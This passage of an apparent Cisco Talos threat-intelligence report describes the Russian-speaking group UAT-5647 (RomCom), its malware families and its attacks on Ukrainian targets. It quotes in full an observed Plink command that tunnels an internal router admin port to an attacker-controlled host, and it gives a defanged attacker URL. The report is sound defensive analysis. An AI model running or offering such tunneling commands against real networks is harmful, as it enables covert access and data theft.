* Cisco Talos has observed a new wave of attacks active since at least late 2023, from a Russian speaking group we track as “UAT-5647”, against Ukrainian government entities and unknown Polish entities.
* UAT-5647 is also known as  **RomCom** and is widely attributed to Russian speaking threat actors in [open-source reporting.](https://www.microsoft.com/en-us/security/blog/2023/07/11/storm-0978-attacks-reveal-financial-and-espionage-motives/)
* The latest series of attacks deploys an updated version of the [RomCom](https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/) malware we track as “**SingleCamper**”. This version is loaded directly from registry into memory and uses loopback address to communicate with its loader.
* UAT-5647 has also evolved their tooling to include four distinct malware families: two downloaders we track as RustClaw and MeltingClaw; a RUST-based backdoor we call DustyHammock; and a C++ based backdoor we call ShadyHammock.
* During its lateral movement, the threat actor attempted to compromise edge devices by tunneling internal interfaces to external, remote hosts controlled by UAT-5647. If successful, it would have higher chances of evading detection during the incident response process.

UAT-5647 has long been considered a multi-motivational threat actor performing both ransomware and espionage-oriented attacks. However, UAT-5647 has accelerated their attacks in recent months with a clear focus on establishing long–term access for exfiltrating data of strategic interest to them. Our assessment, in line with recent reporting from [CERT-UA](https://cert.gov.ua/article/6280099) and [Palo Alto Networks](https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/), indicates that the threat actor is aggressively expanding their tooling and infrastructure to support a wide variety of malware components authored in diverse languages and platforms such as GoLang, C++, RUST and LUA.

Talos further assesses that this specific series of attacks, targeting high profile Ukrainian entities, is likely meant to serve UAT-5647's two-pronged strategy in a staged manner – establish long-term access and exfiltrate data for as long as possible to support espionage motives, and then potentially pivot to ransomware deployment to disrupt and likely financially gain from the compromise. It is also likely that Polish entities were also targeted, based on the keyboard language checks performed by the malware.

## UAT-5647 infection chain

The infection chain consists of a spear-phishing message delivering a downloader consisting of either of two variants: “RustyClaw” – a RUST-based downloader, and a C++ based variant we track as “MeltingClaw”. The downloaders make way for and establish persistence for two distinct backdoors we call “DustyHammock” and “ShadyHammock,” respectively.

DustyHammock is a more straightforward backdoor meant to be the core malicious component of the infection communicating with its command and control (C2) and performing malicious actions. ShadyHammock is, however, a two-pronged backdoor responsible for loading and activating the SingleCamper implant (RomCom malware variant) on an infected system and optionally listening for incoming commands from another malicious component.

The overall infection chain can be visualized as:

# UAT-5647's post-compromise activity

The post-compromise activity by UAT-5647 is standard to what we would expect for a threat actor whose primary motivation is espionage. There is however one set of actions that stand out. It is our assessment that at some point the threat actor started targeting the edge devices, from inside the compromised network. This and other activities are detailed in the following sub-sections.

## Tunneling into the enterprise

Once preliminary network reconnaissance was completed, UAT-5647 downloaded PuTTY’s Plink tool to establish remote tunnels between accessible endpoints and attacker-controlled servers [[T1572](https://attack.mitre.org/techniques/T1572/)]. While this is a common practice, one of the configurations was mapping the internal admin port of an edge device.

```
cmd /C %public%\pictures\iestatus[.]exe -pw _passwd_ -batch -hostkey SHA256:_KEY_ -N -R 8080:_IP_IN_INFECTED_NETWORK_:80 root@_ATTACKERS_REMOTE_IP_ -P 7722
```

Any traffic sent to Port 8088 on the attacker-controlled remote server will be forwarded to Port 80 on (<IP\_IN\_INFECTED\_NETWORK>)**.** This technique effectively exposes the application on Port 80 to the attackers allowing them to:

* Brute force or password spray to gain access to the service.
* Monitor and exfiltrate data and configuration from the application once access has been achieved.

Based on URLs exposed to the threat actors now on Port 8088 such as “hxxp[://]193[.]42[.]36[.]131:8088/help/LanArpBindingListHelpRpm[.]htm”, “userRpm/VirtualServerRpm.htm”, and Censys data, it is likely that the <IP\_IN\_INFECTED\_NETWORK> IP address is a “TP-LINK Wireless G Router WR340G”.

## UAT-5647’s lateral movement and system discovery

The threat actors were particularly interested in network reconnaissance, evident from the rep...
